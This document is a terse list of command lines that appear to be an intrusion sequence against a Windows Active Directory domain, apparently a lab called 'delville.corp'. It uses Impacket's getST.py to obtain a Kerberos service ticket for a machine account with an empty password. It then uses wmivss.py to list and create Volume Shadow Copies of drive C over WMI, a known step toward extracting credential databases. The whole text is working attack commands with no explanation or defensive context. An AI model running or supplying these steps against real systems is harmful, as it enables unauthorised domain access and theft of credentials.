getST.py -spn HOST/"WIN-3AFVO1DJA68.delville.corp" -no-pass -k -dc-ip "192.168.1.217" "DELVILLE"/"WIN-3AFVO1DJA68$":"" -debug

python3 wmivss.py list WIN-3AFVO1DJA68.delville.corp -k

python3 wmivss.py create WIN-3AFVO1DJA68.delville.corp -k -debug -drive-letter C
